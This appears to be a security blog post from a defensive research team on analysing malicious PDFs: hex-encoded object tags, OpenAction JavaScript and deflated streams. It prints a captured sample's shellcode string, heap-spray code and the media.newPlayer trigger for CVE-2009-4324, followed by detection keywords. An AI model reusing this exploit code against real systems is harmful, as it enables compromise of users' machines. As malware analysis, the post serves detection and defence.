@@ -1,0 +1,97 @@
+
+For obvious reasons, the VRT has been spending a lot of time on the PDF format lately.  While the attack researchers have been concentrating on fuzzing, reverse engineering and data flow analysis, the defense researchers have been automating the backend analysis of PDF submissions.  As part of this effort, we've had to do a very deep dive on the PDF format.  I thought it might be useful to share some of what we're seeing come in our data feeds, and what you should look for when reviewing PDF files.
+
+So let's start with the first structure you have to understand, the obj structure.  For the moment, most everything you really are going to worry about occurs in association with either the obj tags or Javascript.  Here is the obj tag format:
+
+[objnum] [genid] obj (value) endobj
+
+Obj tags declare what sort of data is in this section of the file.  They should be pretty straight forward:
+4 0 obj.<< /Length 5 0 R /Filter /FlateDecode >> stream (Ton of data...) endstream endobj 5 0 obj 185 endobj
+
+The first object above is object number 4 with a genid of 0.  Note that the combination of the object number and gen id are a unique identifier within the PDF spec.  While I haven't seen an example with multiple objnums and genids, I wouldn't put it past someone to give it a shot.  Inside the << >> is a definition of what it is that this object holds.  The object in question is FlateDecoded stream.  It also has a relative reference that you have to understand.  The “/Length” field declares the length of the stream data.  In this case, that value is contained in object number 5.  We know this because of the “ R” structure immediately following the “/Length” tag.
+
+This seems simple, but Adobe has to support extended characters for the various languages around the world.  To support this, they provided the option to ASCII hex encode fields within the PDF document.  This is done by placing the ASCII hexadecimal value for the character you are representing immediately after a “#” character.   So the letter “A” can be represented as #41.
+
+So attackers use this feature to obscure the feature calls so you can’t look specifically object tags like JBIG2 or JavaScript tags.  So  the following object string:
+
+/Type/Action/S/JavaScript/JS 6 0 R 
+
+Could be represented as:
+
+/Typ#65/#41#63t#69#6fn/S/#4a#61#76a#53cript/J#53 6 0 R
+
+You can use Didier Stevens’ pdf-parser.py script to deobfuscated object tags with ASCII hex encoding. So the file we’re looking at has the following deobfuscated lines:
+
+(obj 1) /Type/Catalog/Outlines 2 0 R/Pages 3 0 R/OpenAction 5 0 R
+(obj 2) /Type/Outlines/Count 0
+(obj 3)/Type/Pages/Kids[4 0 R]/Count 1
+(obj 4) /Type/Page/Parent 3 0 R/MediaBox[0 0 612 792]
+(obj 5) /Type/Action/S/JavaScript/JS 6 0 R
+(obj 6) /Length 2008/Filter[/FlateDecode/ASCIIHexDecode]
+
+Besides the obfuscation, the OpenAction->Javascript->FlateDecode sequence should immediately concern you.  The OpenAction declaration in the object tag means that the associated data should immediately be executed.  In this case it is a relative reference to object 5.  Object 5 in turn declares the data as JavaScript and points to object 6.  Object 6 is a deflated stream of data, which gives us a new obstacle to deal with. 
+
+So object 6 looks like this:
+00000190  3E 65 6E 64 6F 62 6A 0D 0A 36 20 30 20 6F 62 6A <endobj..6 0 obj
+000001A0  3C 3C 2F 4C 23 36 35 6E 23 36 37 23 37 34 68 20 <</L#65n#67#74h 
+000001B0  32 30 30 38 2F 23 34 36 69 6C 23 37 34 65 23 37 2008/#46il#74e#7
+000001C0  32 5B 2F 23 34 36 6C 23 36 31 74 65 44 23 36 35 2[/#46l#61teD#65
+000001D0  63 23 36 66 64 65 2F 23 34 31 53 23 34 33 23 34 c#6fde/#41S#43#4
+000001E0  39 23 34 39 23 34 38 65 23 37 38 23 34 34 23 36 9#49#48e#78#44#6
+000001F0  35 23 36 33 23 36 66 23 36 34 23 36 35 5D 3E 3E 5#63#6f#64#65]>>
+00000200  0D 0A 73 74 72 65 61 6D 0D 0A 78 9C 7D 59 6D 92 ..stream..x.}Ym.
+00000210  EB 36 0C BB 8A 8E 60 EB D3 FE D3 BB 64 B3 DB FB .6....`.....d...
+00000220  1F A1 24 01 52 92 93 E9 4C 37 4D 64 89 22 41 10 ..$.R...L7Md."A.
+00000230  94 F5 8E 57 1A 3D F5 33 8D 9C 52 CA 87 7C D4 7F ...W.=.3..R..|..
+00000240  E5 A3 BF E5 CB 4B BE B4 91 9A 3C EA FA 57 75 6E .....K....>..Wun
+00000250  C2 47 6F FA 4D 3F 64 B1 4D 4B FD 4E AD CA B2 92 .Go.M?d.MK.N....
+00000260  FA 0B 13 C6 0D 2B 3A 3C C4 76 BF 6C 48 0D A6 21 .....+:>.v.lH..!
+Etc…..
+
+Using Didier Stevens’ pdf-parser, we can get an inflated view of object 6 we can inflate object 6 by using the following arguments:
+[kpyke@segfault]$./pdf-parser.py -o6 -f bad.pdf
+Let’s take the output one block at a time.  Looking at this, your first thought is probably "What the hell is with that variable name?".  This is a common JavaScript obfuscation technique.  By randomizing the variable names, it is difficult for IDS/AV systems to target them with set signatures.  It is definitely a sign that this file is jacked.
+
+The first variable puts the shellcode into memory:
+
+var OlJWRbdvveuaWiTCjeyJTphyRwPgnwjlnPwhiTXRqYmV = unescape("%uc931%u89bf%ucf5a%ub1ac%udb48%ud9ca%u2474%u5af4%uea83%u31fc%u0d7a%u7a03%ue20d%ua67c%u2527%u577e%u56b8%ub2f7%u4489%ub663%u58b8%u9ae0%u1230%u0ea4%u56c2%u2060%udc63%u0f56%ud074%uc356%u72b6%u1e2a%u54eb%ud113%u95fe%u0c54%uc4f0%u5a0d%uf8a3%u1e3a%uf878%u14ec%u82c0%ueb89%u38b5%u3b90%u3665%ua3da%u100d%ud2fa%u42c2%u9dc6%ub06f%u1fbd%u88a6%u2e3e%u4786%u9e01%u990b%u1946%uecf4%u59bc%uf689%u2307%u7255%u8395%u241e%u357d%ub3f2%u39f6%ub0bf%u5e50%u143e%u5aeb%u9bcb%ueb3b%ubf8f%ub79f%ua154%u1d86%ude3a%ufad8%u7ae3%ue993%ufdf0%u67fe%u8f06%uc185%u8f08%u6185%ube61%uee0e%u3ff6%u4ac5%u0a08%ufa47%ud381%ube12%ue3cf%ufdc9%u67e9%u7dfb%u770e%u788e%u3f4a%uf163%uaac3%ua683%ufee4%u25e0%u2f7f%ucd83%u0f1a%u4d64%u21c5%ue51f%ucb25%u60ac%u1354%u0e3f%u32ec%ua0cc%uda60%u355b%u4959%uc1fe%ue2f8%u4670%u6d94%ub604%u2f45%uf2a0%u89b9%udb0e%ub0d7%u3b3a%u5444%u5aa1%ucdf8%uf257%u6275%u4db7%uef12%u23de%u9cb3%uce54%u1722%u5cfb%uf7d6%uc46e%u996c%u7603%u36e1%u028a%ue7d9%uaf0d%uf85d");
+The second block of code sets up the heap spray and adjust the
+<var WmBcOiflJCZIlBHlQMYvLqUsYVqUOiZajvemAdT = unescape("%u41b1%u483f");
+while(WmBcOiflJCZIlBHlQMYvLqUsYVqUOiZajvemAdT.length >= 32768) WmBcOiflJCZIlBHlQMYvLqUsYVqUOiZajvemAdT+=WmBcOiflJCZIlBHlQMYvLqUsYVqUOiZajvemAdT;WmBcOiflJCZIlBHlQMYvLqUsYVqUOiZajvemAdT=WmBcOiflJCZIlBHlQMYvLqUsYVqUOiZajvemAdT.substring(0,32768 - OlJWRbdvveuaWiTCjeyJTphyRwPgnwjlnPwhiTXRqYmV.length);
+memory=new Array();
+
+for(i=0;i<0x2000;i++) {
+     memory[i]= WmBcOiflJCZIlBHlQMYvLqUsYVqUOiZajvemAdT + OlJWRbdvveuaWiTCjeyJTphyRwPgnwjlnPwhiTXRqYmV;
+The final block is the vulnerability triggering condition.  In this case, it is an exploit of the media.newPlayer vulnerability in Adobe Reader (CVE-2009-4324):
+util.printd("1.345678901.345678901.3456 : 1.31.34", new Date());
+util.printd("1.345678901.345678901.3456 : 1.31.34", new Date());
+try {this.media.newPlayer(null);} catch(e) {}
+util.printd("1.345678901.345678901.3456 : 1.31.34", new Date());
+So to recap, important things to know about PDFs, just to get started:
+ ASCII hex encoding, particularly alternating between non-encoded and encoded characters, should raise red flags.
+
+ The OpenAction tag should get your attention, but it does exist in valid documents.
+
+ You need to get out there and check out JavaScript obfuscation, although you should certainly be able to just point to the block and go "I don't know what the hell that is, but it ain't right".
+
+ In particular, look for the following JS obfuscation keywords:
+unescape
+syncAnnotScan
+getAnnots
+replace
+
+In particular, look for the following JS obfuscation techniques:
+Renaming functions and then calling the new name
+Providing blocks of ASCII hex encoded data separated by a single character and then replacing that char with a "%", then using that block as an unescape.
+Randomized variable strings
+
+ 4 & 5 aren't even close to an exhaustive list.
+
+ Track the work of Didier Stevens:
+Go here: http://blog.didierstevens.com/programs/pdf-tools/ 
+And then keep going here:  http://blog.didierstevens.com/
+And follow : http://twitter.com/didierstevens
+
+ Most of the bad stuff you'll see will look wrong right out of the box. Trust your instincts.
+
+
